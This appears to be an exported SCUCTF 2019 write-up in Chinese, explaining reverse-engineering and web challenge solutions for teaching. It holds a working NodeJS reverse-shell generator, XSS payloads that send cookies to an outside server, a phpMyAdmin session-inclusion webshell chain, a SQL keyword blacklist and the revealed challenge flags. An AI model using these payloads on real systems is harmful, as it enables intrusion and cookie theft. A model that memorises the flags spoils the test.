^ ord ( ch ) index = 2 * ( v14 & 0xff ) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'origin=' , map ( hex , origin )) blks = [] for r in range ( 8 ): e = result [ 1 ] & 0xff000000 for i in range ( len ( data )): if e == data [ i ] & 0xff000000 and i % 2 == 1 : blks . append ( i ) result [ 1 ] = (((( result [ 1 ] ^ data [ i ])) << 8 ) & 0xffffffff ) print ( map ( hex , result )) result [ 0 ] = ( result [ 0 ] ^ data [ i - 1 ]) & 0xffffffff result [ 1 ] += ( result [ 0 ] & 0xff000000 ) >> 24 result [ 0 ] = ( result [ 0 ] << 8 ) & 0xffffffff print ( map ( lambda x : hex ( data [ x ]), blks )) for n in num : origin = [ 0x424fa357 , 0x3f6a6fab ] ind = [] number = '' for i in range ( len ( blks ) + 1 ): if i == 0 : v14 = origin [ 0 ] ^ ord ( n ) index = 2 * ( v14 & 0xff ) number += n else : index = blks [ len ( blks ) - i ] - 1 number += ( chr (( origin [ 0 ] ^ ( index / 2 )) & 0xff )) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'n=' , n , ' i=' , i , map ( hex , origin ), number ) print ( map ( hex , origin )) \u53ef\u4ee5\u770b\u5230 201914153 \u662f\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165 \u968f\u540e flag \u5373\u4e3a scuctf{b@sE2019_scucs_201914153}","title":"baha(dondayoo~\u6218\u961f wp)"},{"location":"WriteUp/201905/Web/","text":"Web \u00b6 \u4f60\u597d\u5440 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 NodeJS \u53cd\u5e8f\u5217\u5316 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6253\u5f00\u9898\u76ee\uff0cF12 \u67e5\u770b\u6e90\u7801\uff0c\u5728\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5728 /app.js.bak \u5904\u53ef\u4ee5\u67e5\u770b\u6e90\u7801\u3002 \u67e5\u770b\u6e90\u7801\u4e4b\u540e\uff0c\u53d1\u73b0\u4e00\u5904\u53cd\u5e8f\u5217\u5316\uff0c\u8003\u8651\u4f7f\u7528\u53cd\u5e8f\u5217\u5316\u6765\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u7531\u4e8e NodeJS \u7684\u4ee3\u7801\u6267\u884c\u5728\u540e\u7aef\u6267\u884c\uff0c\u6ca1\u6709\u56de\u663e\uff0c\u6b64\u5904\u6709\u51e0\u79cd\u5e38\u89c1\u65b9\u5f0f\u83b7\u5f97\u56de\u663e\uff1aDNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\uff0c\u53cd\u5411 Shell\uff08\u7531\u4e8e docker \u53ea\u5f00\u653e\u4e86\u4e00\u4e2a\u7aef\u53e3\uff0c\u65e0\u6cd5\u4f7f\u7528\u6b63\u5411 Shell\uff09\u3002 DNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\u7684\u5229\u7528\u65b9\u6cd5\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\uff0c\u6b64\u5904\u5c55\u793a\u4f7f\u7528\u53cd\u5411 shell \u7684\u65b9\u6cd5\u3002\u9996\u5148\uff0c\u9700\u8981\u751f\u6210\u4e00\u4e2a nodejs \u7684\u53cd\u5411 shell\uff0c\u811a\u672c\u5982\u4e0b\uff1a import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) \u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell\uff0c\u7136\u540e\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u53cd\u5411 shell \u653e\u5230 cookie \u91cc\u3002\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61 y={rce : function (){}} ,\u5c06\u4e0a\u9762\u7684\u7a0b\u5e8f\u751f\u6210\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u82b1\u62ec\u53f7\u4e2d\uff0c\u4f7f\u7528 serialize \u65b9\u6cd5\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5f97\u5230\u7684\u4ee3\u7801\u5728\u51fd\u6570\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u4f7f\u5176\u80fd\u81ea\u52a8\u6267\u884c\u3002\u6548\u679c\u5982\u4e0b\uff1a \u4e09\u9053 XSS \u603b\u62ec \u00b6 \u6b64\u6b21\u6bd4\u8d5b\u7684\u4e09\u9053 XSS \u662f\u672c\u7740\u4e0d\u51fa\u8111\u6d1e\u7684\u60f3\u6cd5\u51fa\u7684\uff0c\u9898\u76ee\u672c\u8eab\u6ca1\u6709\u7ed5\u592a\u591a\u5708\u5708\uff0c\u4f46\u662f\u5728\u6bd4\u8d5b\u73af\u5883\u4e0b\u6ca1\u6709\u8003\u8651\u5230\u8d44\u6e90\u5360\u7528\u8fc7\u591a\u548c\u50f5\u5c38\u7a0b\u5e8f\u7684\u60c5\u51b5\uff0c\u5bfc\u81f4\u7f51\u9875\u5de8\u5361\u65e0\u6bd4\u548c\u4e0d\u80fd\u6253\u51fa flag \u7684\u73b0\u8c61\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u51fa\u9898\u65f6\u5404\u51fa\u9898\u4eba\u6ca1\u6709\u534f\u5546 flag \u683c\u5f0f\u7684\u95ee\u9898\uff0c\u6211\u5f55\u5165 docker \u7684\u65f6\u5019 flag \u683c\u5f0f\u5c31\u4e3a fl4g{} \uff0c\u6700\u540e\u4e0a\u9898\u7684\u65f6\u5019\u53c8\u8981\u6c42 scuctf{} \uff0c\u53ef\u80fd\u5751\u4e86\u4e00\u4e9b\u4eba\uff0c\u505a\u9898\u4f53\u9a8c\u5e76\u4e0d\u597d\uff0c\u5728\u8fd9\u91cc\u8868\u793a\u62b1\u6b49 \u4e09\u9053\u9898\u90fd\u662f\u540c\u4e00\u4e2a\u63d0\u4ea4\u5e73\u53f0\uff0c\u4f7f\u7528\u5b50\u8def\u5f84\u4f5c\u4e3a\u9650\u5236(\u63a8\u8350\u9605\u8bfb\uff1a https://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html )\uff0c\u4ee5\u8fbe\u5230\u4e09\u9898\u5206\u79bb\u4f46\u662f\u53c8\u4f7f\u7528\u540c\u4e00\u4e2a bot \u7684\u6548\u679c\u3002\u5176\u5b9e\u5728\u8fd9\u91cc\u6211\u8fd8\u662f\u633a\u6015\u51fa\u73b0\u7b80\u5355\u9898\u6253\u5230\u56f0\u96be\u9898\u7684 flag \u7684\u975e\u9884\u671f\u89e3\uff08\u867d\u7136\u5fc3\u7406\u4e0a\u8fd8\u662f\u6bd4\u8f83\u80af\u5b9a\u4e0d\u4f1a\u51fa\u8fd9\u79cd\u60c5\u51b5 XD\uff09 \u6240\u4ee5\uff0c \u4e09\u9053\u9898\u90fd\u662f\u5c06\u5305\u542b\u6253 cookie payload \u7684 url \u4ea4\u7ed9\u63d0\u4ea4\u5e73\u53f0\uff0c\u5e73\u53f0 robot \u4f7f\u7528 firefox \u53bb\u8bbf\u95ee\u4f60\u63d0\u4ea4\u7684 url\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5728 cookie \u91cc\u7684 flag \u5410\u69fd\uff1axss bot \u771f\u7684\u5751\uff0c\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u6765\u8c03 bot\uff0c\u7ed3\u679c\u6bd4\u8d5b\u7684\u65f6\u5019\u8fd8\u662f\u51fa\u95ee\u9898\u3002\u3002\u3002\u679c\u7136\u662f\u4ece\u5165\u5751\u5230\u653e\u5f03:) \u63d0\u4ea4\u5e73\u53f0\u622a\u56fe\uff1a \u7b80\u5355\u7684 XSS \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 XSS \u57fa\u672c\u6982\u5ff5 XSS \u83b7\u53d6 cookie \u89e3\u9898\u8fc7\u7a0b \u00b6 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u672c\u9898\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u8f93\u51fa\u4f20\u5165\u503c\uff0c\u5178\u578b\u7684 XSS \u5165\u95e8\u540e\u53f0\u4ee3\u7801\u3002 \u9996\u5148\uff0c\u770b\u5230\u7f51\u9875\u5c06\u4f20\u5165\u7684\u53c2\u6570\u539f\u6837\u8fd4\u56de\uff1a \u8f93\u5165\u7b80\u5355\u7684\u5f39\u7a97 payload: ?greet=<script>alert(document.domain)</script> \u76f4\u63a5\u5f39\u51fa domain\uff0c\u53ef\u89c1\u6b64\u5904\u6709 XSS \u6f0f\u6d1e\uff1a \u83b7\u53d6 flag \u00b6 \u9996\u5148\uff0c\u5c1d\u8bd5\u5c06\u81ea\u5df1\u7684 cookie \u6253\u5230 xss \u5e73\u53f0\u4e0a\u3002 \u76f4\u63a5\u586b\u5165 payload: ?greet=%3Cimg/src=x%20onerror=%22a=%27http://120.78.185.175/xss/myxss?s=%27%2Bdocument.cookie;new%20Image().src=a%22%3E \uff0c\u8bbf\u95ee\uff1a \u770b\u5230\u6210\u529f\u6253\u51fa cookie\uff1a \u5c06 payload \u8f93\u5165\u63d0\u4ea4\u9875\u9762\u83b7\u53d6 flag\uff1a \u6ce8\u610f\u8981\u5f39\u51fa\u4ee5\u4e0b\u7a97\u53e3\u624d\u8bf4\u660e bot \u6210\u529f\u8bbf\u95ee\u4e86 url\uff1a \u67e5\u770b XSS \u5e73\u53f0\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6253\u5230\u7684 flag\uff1a \u7a0d\u96be\u4e00\u70b9\u7684 XSS \u00b6 \u672c\u9898\u7075\u611f\u6765\u6e90\u4e8e\u4e00\u7bc7\u6f0f\u6d1e\u60ac\u8d4f\u7684\u5b9e\u6218 blog\uff0c\u6211\u8bb0\u4e0d\u5230\u5177\u4f53\u51fa\u5904\u4e86\uff0c\u5c31\u63a8\u8350\u4e00\u4e2a \u7f51\u7ad9 \u5427 \u8003\u5bdf\u8981\u70b9 \u00b6 CSP DOM XSS\uff08Script Gadgets\uff09 \u7ed5\u8fc7 CSP Angularjs \u89e3\u9898\u8fc7\u7a0b \u00b6 \u672c\u9898\u5728\u7ed9\u51fa hint \u4e4b\u540e\u96be\u5ea6\u964d\u4f4e\u4e86\uff0c\u987a\u7740\u601d\u8def\u8d70\u5c31\u884c\u3002 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u8fd8\u662f\u67e5\u770b\u7f51\u9875\uff0c\u53d1\u73b0\u8fd9\u56de\u6709 CSP \u7b56\u7565\u4e86\uff0c\u5176\u4e2d\u6709\u4e2a\u70b9\u503c\u5f97\u6ce8\u610f\uff1aCSP \u5bf9 sina \u67d0\u57df\u4e0b\u653e\u884c: *.sinaapp.com \uff1a \u8fd9\u4e2a\u57df\u4e0b\u6709\u5565\u597d\u4e1c\u897f\u5462\uff0c\u8fd9\u4e2a\u57df\u4e0b\u6709 lib.sinaapp.com \u662f\u4e2a CDN\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165 JS \u5e93\u3002\u4e8e\u662f\u5c31\u60f3\u8d77 17 \u5e74 blackhat \u4e0a\u7684\u6f14\u8bb2\uff1a Script Gadgets \u5728\u8be5\u57df\u4e0b\u627e\u5230\u6709 angularjs \u7684\u5e93\uff0c\u5e76\u4e14\u5b58\u5728\u8001\u7248\u672c\u7684\u5e93: \u8001\u7248\u672c\u7684\u5e93\u6ca1\u6709\u5b89\u5168\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7 CSP \u7684\u6548\u679c\uff0cpayload \u4e3a\uff1a <div ng-app> {{constructor.constructor('alert(document.domain)')()}} </div> \u6784\u9020\u5f39\u7a97 payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php??guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"alert(document.domain)\")()}}%3C/div%3E \u6210\u529f\u5f39\u7a97\uff1a \u83b7\u53d6 flag \u00b6 \u90fd\u5df2\u7ecf\u5f39\u7a97\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u597d\u529e\u4e86\uff0c\u7c7b\u4f3c\u7b2c\u4e00\u9898\uff0c\u76f4\u63a5\u4e0a payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php?guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;\")()}}%3C/div%3E \u62ff\u5230 flag\uff1a \u66f4\u96be\u7684 XSS \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u539f\u6709\u7684 script \u6807\u7b7e\u53ef\u88ab\u4e4b\u524d\u63d2\u5165\u7684 <script> \u7834\u574f \u6807\u7b7e name \u53ef\u4ee5\u901a\u8fc7 js \u76f4\u63a5\u6210\u4e3a\u53d8\u91cf\u4ece\u800c\u8986\u76d6\u53d8\u91cf \u641c\u539f\u9898\u7684\u80fd\u529b:) \u539f\u9898 WP \u00b6 \u672c\u9898\u6765\u6e90\u4e8e TCTF2018 \u7684 bl0g \u9898 \u539f\u9898 WP \u63a8\u8350 https://lorexxar.cn/2018/04/05/0ctf2018-blog/ \u89e3\u9898\u8fc7\u7a0b \u00b6 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u8fdb\u5165\u7f51\u9875\uff0c\u8fd8\u662f CSP\uff0c\u4f46\u662f\u66f4\u4e25\u683c\u4e86\uff1a \u66f4\u6539 payload\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u53c2\u6570\u8f93\u51fa\u7684\u4e24\u4e2a\u4f4d\u7f6e\uff1a \u9875\u9762\u4e2d\u7684 JS \u4ee3\u7801\u8fd0\u884c\u8fc7\u7a0b\u5206\u6790\u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u6bb5\u6e90\u7801\u5c06\u7b2c\u4e00\u6bb5\u6e90\u7801\u4e2d\u51fa\u73b0\u7684\u8fde\u63a5 append \u5230\u7f51\u9875\u540e\uff1a \u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u63a7\u70b9\u4e00\u4e2a\u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u524d\uff0c\u4e00\u4e2a\u5219\u76f4\u63a5\u51b3\u5b9a\u4e86 name_links \u7684\u7d22\u5f15\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2a\u53ef\u63a7\u70b9\u7834\u574f\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u6784\u9020 name \u4e3a name_links \u7684 form \u6807\u7b7e\uff0c\u5e76\u76f4\u63a5\u901a\u8fc7 name_links \u83b7\u53d6\u6211\u4eec\u6784\u9020\u7684\u6807\u7b7e\u7684 id \u503c\uff0c\u5e76\u628a\u503c\u8f93\u51fa\u5728\u9875\u9762\u4e0a\uff1b\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u5c06\u6076\u610f payload \u6ce8\u5165\u7f51\u9875\u3002\uff08\u53ef\u80fd\u903b\u8f91\u6709\u70b9\u6655\uff0c\u5efa\u8bae\u5bf9\u7167 TCTF \u539f\u9898 WP \u4e00\u8d77\u7406\u89e3\uff09 \u6700\u540e\uff0c\u5f39\u7a97 payload \u5982\u4e0b\uff08\u9700\u8981\u6ce8\u610f\u7684\u4e24\u70b9\u662f\uff0c1. \u53ea\u6709\u6807\u7b7e\u539f\u6709\u7684\u5c5e\u6027\u540d\u624d\u80fd\u6210\u529f\u83b7\u53d6\u5230\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662f id \u6765\u83b7\u53d6\uff1b2. \u5728\u8fd9\u91cc\u6211\u8fc7\u6ee4\u4e86\u9664 form \u5916\u7684\u5176\u4ed6\u6807\u7b7e\uff0c\u6240\u4ee5\u9700\u8981\u5148\u95ed\u5408\u524d\u9762\u7684 form \u6807\u7b7e\uff0c\u539f\u9898\u7684 WP \u4e0d\u80fd\u76f4\u63a5\u7528\uff09\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=%22%3E%3Cscript%3E&ft_id=id%22%3E%3C/form%3E%3CForm+name%3Dname_links+id%3D%22%3Cscript%3Ealert(document.domain);%3C%2Fscript%3E%22%3E \u5f39\u7a97\u5982\u4e0b\uff1a \u83b7\u53d6 flag \u00b6 \u540c\u7b2c\u4e8c\u9898\uff0c\u90fd\u5f39\u7a97\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7528\u8bf4\u4e86\uff0c\u6253 flag\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=\"><script>&ft_id=id\"></form><Form+name%3Dname_links+id%3D\"<script>document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;<%2Fscript>\"> flag: \u51fa\u9898\u4eba\u5bc4\u8bed \u00b6 \u6700\u540e\uff0c\u795d\u8d3a\u5728\u6bd4\u8d5b\u4e2d\u6253\u51fa\u4e09\u9053\u9898\u7684\u5927\u4f6c XD\uff0c\u4e5f\u5e0c\u671b\u6ca1\u6709\u6253\u51fa\u6765\u7684\u540c\u5b66\u4eec\u80fd\u5b66\u5230\u4e00\u4e9b\u4e1c\u897f\uff0c\u8fd9\u6837\u8fd9\u4e09\u9898\u7684\u4f7f\u547d\u5c31\u5b8c\u6210\u4e86\u3002 \u827e\u8fea\u9b54\u529b\u8f6c\u5708\u5708 \u00b6 \u8fd9\u9053\u9898\u522b\u770b 400 \u591a\u5206\u5728 Web \u9898\u91cc\u5206\u662f\u6700\u9ad8\u7684\uff0c\u5176\u5b9e\u8fd9\u4e5f\u7b97\u4e00\u9053\u9001\u5206\u9898\uff0c\u5b9e\u9645\u96be\u5ea6\u5927\u6982 150 \u5206\u5de6\u53f3 \u5230\u6700\u540e\u53ea\u6709\u56db\u4e94\u4e2a\u961f\u4f0d\u505a\u51fa\u6765\uff0c\u8fd8\u662f\u6709\u4e9b\u611f\u6168 \u9898\u76ee\u63d0\u793a\u4e86\u7528\u6237\u540d\u662f scuctf\uff0c\u5bc6\u7801\u6ca1\u7ed9\uff0c\u8fd9\u79cd\u60c5\u51b5\u90fd\u662f\u5f31\u53e3\u4ee4\uff0c\u76f4\u63a5 BurpSuite \u7206\u7834\u4e00\u4e0b 123456 \u5c31\u51fa\u6765\u4e86 \u8fdb\u53bb\u770b\u5230 PhpMyAdmin\uff0c\u6ca1\u6709\u5168\u5c40\u6743\u9650\uff0c\u90a3\u5c31\u4e0d\u53ef\u4ee5\u5199\u6587\u4ef6\u4e4b\u7c7b\u7684\uff0c\u53f3\u8fb9\u770b\u5230 PhpMyAdmin \u7248\u672c\u4e3a 4.8.1 \u7136\u540e\u641c\u4e00\u4e0b\u8fd9\u4e2a\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u53d1\u73b0\u4e00\u4e2a\u540e\u53f0 getshell \u7684\u6f0f\u6d1e https://www.cnblogs.com/fox-yu/p/9209203.html \u76f4\u63a5\u4e0a\u6700\u7b80\u5355\u7684\u505a\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e2a\u5199\u5165\u8868\u5185\u5305\u542b\u8868\u6587\u4ef6\u7684\u505a\u6cd5\u81ea\u5df1\u627e\u627e\u54c8\uff0c\u539f\u7406\u4e00\u6837~ select '<?php @eval($_GET[1]);?>' ; \u7136\u540e\u5305\u542b\u4e00\u4e0b sess_cookie \u6587\u4ef6 index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie) cookie \u662f phpMyAdmin \u7684\u503c \u7136\u540e index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('ls /'); index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('cat /fl444444g'); \u8fd9\u9053\u9898\u5230\u6b64\u4e3a\u6b62~ \u6765\u4e86\u8001\u5f1f \u00b6 \u8fd9\u9053\u9898\u4e00\u5f00\u59cb\u662f\u6ca1\u4eba\u505a\u51fa\u6765\u7684\uff0c\u4f46\u53ea\u6709 80 \u5206\u7684\u9898\u561b\uff0c\u80fd\u96be\u5012\u90a3\u91cc\u53bb\u5462\uff1f \u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u5730\u5740\uff08\u4fe9\u5730\u5740\u4e00\u6837\uff09 \u7ed9\u7684\u5730\u5740\u53ea\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u4e4b\u540e\u5c31\u4e00\u4e2a\u8170\u5b50\u59d0\u548c PDD\uff0c\u4f46\u662f\u4f60\u4eec\u4ed4\u7ec6\u89c2\u5bdf UR \u91cc\u7684\u53d8\u5316\u4e86\u561b\uff1f \u4f60\u8f93\u5165\u7684\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u53d8\u6210\u4e86 http://47.96.138.65:45787/didi/secret.php apache \u9ed8\u8ba4\u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u4ed6\u5374\u662f\u51fa\u73b0\u7684 secret.php\uff0c\u8fd9\u4e0d\u662f\u6709\u95ee\u9898\u561b F12 \u4e00\u4e0b\u770b\u5230 index.php \u88ab 302 \u8df3\u8f6c\u4e86\uff0c\u5e76\u4e14 flag \u5c31\u5728\u4e0b\u9762\u7684 Set-Cookie \u4e2d\uff0c\u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86 cookie \u751f\u6548\u65f6\u95f4\u4e3a 0.01 \u79d2\uff0c\u4e14\u53ea\u5bb9\u8bb8\u5bf9 index.php \u751f\u6548\uff0c\u6240\u4ee5\u5728\u5176\u4ed6\u7f51\u9875\u91cc\u662f\u770b\u4e0d\u5230\u7684 \u76f4\u63a5\u628a flag \u7684\u503c base64 \u89e3\u7801\u4e00\u4e0b\u5c31\u51fa\u6765 flag \u4e86 \u505a\u9898\u8fc7\u7a0b\u4e2d\u770b\u5230\u6709\u7684\u540c\u5b66\u76f4\u63a5 scuctf{U0NVQ1RGe3kwVV9qVXM3X25lRWRfY2FyM2Z1bH0%3D} \u63d0\u4ea4\u4e86\u4e0a\u6765\uff0c\u5176\u5b9e\u5c31\u5dee\u6700\u540e\u4e00\u6b65\u4e86\uff0c\u6709\u70b9\u53ef\u60dc~ \u6240\u4ee5\u8fd9\u9053\u9898\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u8003\u4e2a\u7b80\u5355\u7684\u6293\u5305\u548c\u770b\u4f60\u7ec6\u5fc3\u7a0b\u5ea6\uff0cOK \u4e0b\u4e00\u9053~ BabySqli \u00b6 \u8fd9\u91cc\u653e\u4e0a\u6e90\u4ee3\u7801 config.php <?php error_reporting ( 0 ); $servername = \"localhost\" ; $username = \"root\" ; $password = \"**********************\" ; $dbname = \"scuctf\" ; function stop_hack ( $value ){ $pattern = \"insert|delete|bool|extractvalue|rand|group|geometrycollection|multipoint|multipolygon|regexp|linestring|multilinestring|name_const|right|char|benchmark|polygon|char|rlike|concat|rpad|repeat|sleep|ascii|innodb|and|if|exp|updatexml|left|pow|concat_ws|group_concat|substr|join|floor|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system| |eval\" ; $back_list = explode ( \"|\" , $pattern ); foreach ( $back_list as $hack ){ if ( preg_match ( \"/ $hack /i\" , $value )) die ( \" $hack detected!Do not want to get flag!!<br>\" ); } return $value ; } ?> index.php <?php include 'config.php' ; error_reporting ( 0 ); $conn = new mysqli ( $servername , $username , $password , $dbname ); if ( $conn -> connect_error ) { die ( \"\u8fde\u63a5\u5931\u8d25: \" ); } $sql = \"SELECT COUNT(*) FROM users\" ; $whitelist = array (); $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); $whitelist = range ( 1 , $row [ 'COUNT(*)' ]); } if ( ! empty ( $_GET [ 'id' ])){ $id = stop_hack ( $_GET [ 'id' ]); $sql = \"SELECT * FROM users WHERE id= $id \" ; if ( ! in_array ( $id , $whitelist )) { die ( \"id $id is not in whitelist.\" ); } $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); foreach ( $row as $key => $value ) { if ( preg_match ( \"/scuctf{.+?}/i\" , $value )){ die ( \"scuctf is found!!\" ); } } echo \"<center><table border='5'>\" ; foreach ( $row as $key => $value ) { echo \"<tr><td><center> $key </center></td><br>\" ; echo \"<td><center> $value </center></td></tr><br>\" ; } echo \"</table></center>\" ; } else { echo \"what do you want do??\" ; } } else { echo \"Please input id!\" ; } ?> \u5efa\u8868 sql \u6587\u4ef6 create database scuctf ; use scuctf ; create table users ( id int ( 6 ) unsigned auto_increment primary key , name varchar ( 20 ) not null , email varchar ( 30 ) not null , salary int ( 8 ) unsigned not null ); INSERT INTO users VALUES ( 1 , 'GodHuang' , 'GodHuang@scuctf.com' , 3000 ); INSERT INTO users VALUES ( 2 , 'GodSun' , 'GodSun@scuctf.com' , 4500 ); INSERT INTO users VALUES ( 3 , 'CaiJiWo' , 'CaiJiWo@scuctf.com' , 2700 ); INSERT INTO users VALUES ( 4 , 'GodWu' , 'GodWu@scuctf.com' , 10000 ); INSERT INTO users VALUES ( 5 , 'GodPang' , 'GodPang@scuctf.com' , 6000 ); create table flag ( guess varchar ( 20 ) not null , fffffffl11lgg varchar ( 30 ) not null , secert varchar ( 30 ) not null , flag varchar ( 30 ) not null ); INSERT INTO flag VALUES ( 'what happened?' , 'scuctf{3q1i_i3_t0o_e43y}' , 'I can not tell you!' , 'I am not flag Hhhhhhh!!' ); \u8fc7\u6ee4\u5982\u4e0b\uff1a $pattern =\" insert|delete|bool|extractvalue| rand|group|geometrycollection|multipoint| multipolygon|regexp|linestring| multilinestring|name_const|right|char| benchmark|polygon|char|rlike|concat|rpad| repeat|sleep|ascii|innodb|and|if|exp| updatexml|left|pow|concat_ws|group_concat| substr|join|floor|\\.\\.\\/|\\.\\/|into| load_file|outfile|dumpfile|sub|hex| file_put_contents|fwrite|curl|system| | eval\"; \u8fd9\u9053\u9898\u6211\u51fa\u9898\u7684\u65f6\u5019\uff0c\u53c2\u8003\u4e86\u5f88\u591a\u5927\u725b\u7684\u535a\u5ba2\u6587\u7ae0\uff0c\u5173\u95ed\u4e86\u62a5\u9519\u63d0\u793a\u548c\u7edd\u5927\u90e8\u5206\u65f6\u95f4\u76f2\u6ce8\u51fd\u6570(\u53ef\u80fd\u6709\u9057\u6f0f\u7684) \u4f46\u6211\u5374\u7559\u4e0b\u4e86 get_lock()\u51fd\u6570 \u9898\u76ee\u4e0a\u7ebf\u524d\uff0c\u6211\u628a or \u548c and \u6b63\u5219\u5339\u914d\u8fc7\u6ee4\u4e86\uff0c\u5bfc\u81f4\u4e0d\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 information \u6765\u67e5\u8be2\u8868\u548c\u5b57\u6bb5\u540d \u4f46\u4e0a\u7ebf\u540e\u51fa\u4e86\u70b9\u95ee\u9898\uff0cor \u548c and \u5b9e\u9645\u4e0a\u6ca1\u6709\u8fc7\u6ee4\u6389\uff08\u8fd9\u662f\u7b2c\u4e8c\u5929\u624d\u53d1\u73b0\u7684\uff09\uff0c\u5e76\u4e14\u6700\u91cd\u8981\u7684\u662f\u6ca1\u6709\u5168\u5b57\u5339\u914d\uff0c\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5 select * from flag \u5168\u67e5\u51fa\u6765\uff01\u4e8e\u662f\u8d76\u7d27\u4e0b\u7ebf\uff0c\u52a0\u5165\u4e86\u6b63\u5219\u5339\u914d foreach ($row as $key => $value) { if(preg_match(\"/scuctf{.+?}/i\",$value)){ die(\"scuctf is found!!\"); } } 